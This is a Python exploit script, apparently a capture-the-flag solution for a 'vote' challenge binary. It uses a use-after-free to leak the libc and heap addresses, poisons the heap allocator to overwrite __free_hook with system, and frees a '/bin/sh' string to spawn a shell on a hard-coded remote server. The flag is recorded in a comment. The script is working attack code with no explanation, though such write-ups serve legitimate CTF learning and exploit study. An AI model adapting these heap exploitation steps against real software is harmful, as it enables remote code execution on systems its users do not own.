#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './vote'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':True, 'gdbscript':'', 'env':{'LD_PRELOAD':'./libc.so.6'}}, \
                        local   = {'argv':[bin_file], 'env':{'LD_PRELOAD':'./libc.so.6'}}, \
                        remote  = {'host':'69.90.132.248', 'port':3371})
                        # remote  = {'host':'localhost', 'port':4296})
env.set_item('heap_diff', debug = 0, local = 0, remote = 0xc00)
env.select()

#==========

binf = ELF(bin_file)
addr_got_tolower    = binf.got['tolower']

libc = ELF('libc.so.6')
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    rop = ROP(binf)

    v = Vote(conn)

    id1 = v.vote(0xdead, '1'*0x400, 'A'*0x10, 'a')
    v.update_gender(id1, 'x'*0x10)
    v.delete_meta(id1)
    leak = v.update_gender(id1, 'y')

    addr_libc_mainarena = u64(leak[:8]) - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']

    id1 = v.vote(0xdead, '1'*0x20, 'A', 'a')
    id2 = v.vote(0xbeef, '2'*0x20, 'B'*0x20, 'b')
    v.delete_meta(id2)
    v.delete_meta(id1)
    leak = v.update_gender(id1, 'z')
    addr_heap_base = u64(leak[:8]) - 0x17c50 - env.heap_diff
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    v.update_gender(id1, p64(addr_heap_base + 0x14118))

    id1 = v.vote(addr_got_tolower , '1'*0x20, 'A'*0x20, 'a')
    id2 = v.vote(0xbeef, p64(rop.ret.address)*4, 'B', 'b')
    v.delete_meta(id1)

    v.check = False

    id1 = id2   # never free
    id2 = v.vote(addr_got_tolower , '1'*0x20, 'A', 'a')

    v.delete_meta(id2)
    v.update_gender(id2, p64(addr_libc_free_hook))

    id2 = v.vote(addr_got_tolower , '/bin/sh'.ljust(0x20, '\x00'), p64(addr_libc_system).ljust(0x20, b'\x00'), 'a')
    v.delete_meta(id2)

class Vote:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter
        self.check_wo_upper = lambda x : x == x.lower() if isinstance(x, str) else all(map(lambda c : c > 0x7f or not chr(c).isupper(), x))
        self.check          = True

    def vote(self, age, gender, state, cand):
        if self.check and not self.check_wo_upper(gender):
            print(gender)
            raise

        self.sendlineafter('> ', '5')
        self.sendlineafter('(y/n)?\n', 'y')
        self.sendlineafter('age?\n', str(age))
        self.sendlineafter('gender?\n', gender)
        self.sendlineafter('live?\n', state)
        self.sendlineafter('vote?\n', cand)
        self.recvuntil('is ')
        return int(self.recvuntil('.\n', drop=True), 16)

    def update_gender(self, _id, gender):
        if self.check and not self.check_wo_upper(gender):
            print(gender)
            raise

        self.sendlineafter('> ', '4')
        self.sendlineafter('ID: ', hex(_id))
        self.recvuntil('gender: ')
        old = self.recvuntil('\n', drop=True)
        self.sendlineafter('gender?\n', gender)
        return old

    def delete_meta(self, _id):
        self.sendlineafter('> ', '3')
        self.sendlineafter('ID: ', hex(_id))

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack)
    comn.interactive()
    # ASIS{v0t3_vEc7Or_Nev3R_93T_uPd4t3D!!}

if __name__=='__main__':
    main()

#==========
